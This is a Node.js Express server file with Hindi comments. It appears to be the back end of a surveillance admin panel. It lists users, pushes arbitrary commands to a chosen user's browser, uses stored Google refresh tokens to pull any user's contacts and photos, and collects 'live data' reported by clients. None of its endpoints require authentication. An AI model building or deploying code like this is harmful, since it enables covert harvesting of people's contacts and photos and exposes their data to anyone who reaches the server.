// =================================================================
// 1. आवश्यक पैकेज (Dependencies) को इम्पोर्ट करें
// =================================================================
const express = require('express');
const webpush = require('web-push');
const bodyParser = require('body-parser');
const path = require('path');
const admin = require('firebase-admin');
const { google } = require('googleapis');

// =================================================================
// 2. Firebase एडमिन को शुरू करना (★★★★★ यहाँ ज़रूरी बदलाव किया गया है ★★★★★)
// =================================================================
let db; // <--- बदलाव 1: db को यहाँ घोषित करें ताकि यह पूरी फाइल में उपलब्ध रहे
try {
    const serviceAccount = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT_KEY);
    admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
    db = admin.firestore(); // <--- बदलाव 2: यहाँ से 'const' हटाएं ताकि यह ऊपर वाले db को इस्तेमाल करे
    console.log("Firebase Admin सफलतापूर्वक शुरू हो गया है।");
} catch (error) {
    console.error("Firebase Admin को शुरू करने में विफल:", error);
    process.exit(1);
}

// =================================================================
// 3. सर्वर और VAPID कुंजियों को सेटअप करें (अपरिवर्तित)
// =================================================================
const app = express();
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

const publicVapidKey = process.env.PUBLIC_VAPID_KEY;
const privateVapidKey = process.env.PRIVATE_VAPID_KEY;

webpush.setVapidDetails('mailto:your-email@example.com', publicVapidKey, privateVapidKey);

// =================================================================
// 4. API रूट्स (Endpoints) - अब यह सही से काम करेगा
// =================================================================

let reportedData = [];

// ---- रूट 1: एडमिन पैनल के लिए सभी उपयोगकर्ताओं की लिस्ट लाना ----
app.get('/get-users', async (req, res) => {
    try {
        // अब 'db' यहाँ पर परिभाषित (defined) है और सही से काम करेगा
        const usersSnapshot = await db.collection('users').get();
        
        const users = usersSnapshot.docs.map(doc => ({
            uid: doc.id,
            displayName: doc.data().displayName,
            email: doc.data().email,
            photoURL: doc.data().photoURL
        }));
        res.status(200).json(users);
    } catch (error) {
        console.error("उपयोगकर्ताओं को लाने में त्रुटि:", error);
        res.status(500).json({ error: 'Failed to fetch users.' });
    }
});

// ---- रूट 2: किसी चुने हुए उपयोगकर्ता को कमांड भेजना (अपरिवर्तित) ----
app.post('/send-command', async (req, res) => {
    const { userId, command } = req.body;
    try {
        const userDoc = await db.collection('users').doc(userId).get();
        if (!userDoc.exists) return res.status(404).json({ error: 'User not found.' });
        const { pushSubscription } = userDoc.data();
        if (!pushSubscription) return res.status(400).json({ error: 'User not subscribed.' });

        await webpush.sendNotification(pushSubscription, JSON.stringify(command));
        res.status(200).json({ success: true });
    } catch (error) {
        console.error("कमांड भेजने में त्रुटि:", error);
        res.status(500).json({ error: 'Failed to send command.' });
    }
});

// ================================================================================
// === Stale Token Fix (अपरिवर्तित) ===
// ================================================================================

async function getAuthenticatedGoogleClient(userId) {
    const userDoc = await db.collection('users').doc(userId).get();
    if (!userDoc.exists) {
        throw new Error('User not found.');
    }

    const { googleAccessToken, googleRefreshToken } = userDoc.data();
    if (!googleRefreshToken) {
        throw new Error('User has no refresh token.');
    }

    const oauth2Client = new google.auth.OAuth2(
        process.env.GOOGLE_CLIENT_ID,
        process.env.GOOGLE_CLIENT_SECRET
    );

    oauth2Client.setCredentials({
        access_token: googleAccessToken,
        refresh_token: googleRefreshToken
    });

    await oauth2Client.getAccessToken();

    return oauth2Client;
}

// ---- रूट 3: किसी उपयोगकर्ता के गूगल कॉन्टैक्ट्स लाना (अपरिवर्तित) ----
app.get('/get-contacts/:userId', async (req, res) => {
    const { userId } = req.params;
    try {
        const oauth2Client = await getAuthenticatedGoogleClient(userId);
        const people = google.people({ version: 'v1', auth: oauth2Client });
        const response = await people.people.connections.list({
            resourceName: 'people/me',
            personFields: 'names,emailAddresses,phoneNumbers',
        });
        res.status(200).json(response.data.connections || []);
    } catch (error) {
        console.error(`कॉन्टैक्ट्स लाने में त्रुटि (User: ${userId}):`, error.message);
        res.status(500).json({ error: `Failed to fetch contacts: ${error.message}` });
    }
});

// ---- रूट 4: किसी उपयोगकर्ता की गूगल फोटोज लाना (अपरिवर्तित) ----
app.get('/get-photos/:userId', async (req, res) => {
    const { userId } = req.params;
    try {
        const oauth2Client = await getAuthenticatedGoogleClient(userId);
        const accessToken = oauth2Client.credentials.access_token;

        const photoApiUrl = 'https://photoslibrary.googleapis.com/v1/mediaItems?pageSize=50';
        const photoResponse = await fetch(photoApiUrl, {
            headers: { 'Authorization': `Bearer ${accessToken}` }
        });
        const photoData = await photoResponse.json();
        
        if (photoData.error) { throw new Error(photoData.error.message); }
        
        res.status(200).json(photoData.mediaItems || []);
    } catch (error) {
        console.error(`फोटोज लाने में त्रुटि (User: ${userId}):`, error.message);
        res.status(500).json({ error: `Failed to fetch photos: ${error.message}` });
    }
});

// ---- रूट 5 और 6 (अपरिवर्तित) - लाइव डेटा को संभालने के लिए ----
app.post('/report-data', (req, res) => {
    const data = req.body;
    data.timestamp = new Date().toISOString();
    reportedData.push(data);
    res.status(200).json({ status: 'success' });
});

app.get('/get-reported-data', (req, res) => {
    res.status(200).json(reportedData);
    reportedData = [];
});

// =================================================================
// 6. सर्वर को शुरू करना
// =================================================================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`सर्वर पोर्ट ${PORT} पर शुरू हो गया है।`);
});
